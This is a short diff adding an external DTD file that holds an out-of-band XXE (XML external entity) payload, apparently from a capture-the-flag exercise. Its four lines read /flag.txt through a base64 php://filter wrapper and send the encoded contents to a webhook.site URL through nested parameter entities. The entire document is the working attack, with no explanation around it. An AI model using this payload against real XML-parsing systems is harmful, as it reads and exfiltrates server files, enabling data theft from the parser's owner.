@@ -1,0 +1,4 @@
+<!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource=/flag.txt">
+<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'https://webhook.site/f97fcc36-f9d8-4736-bdde-facf929099cf/?data=%file;'>">
+%eval;
+%exfil;
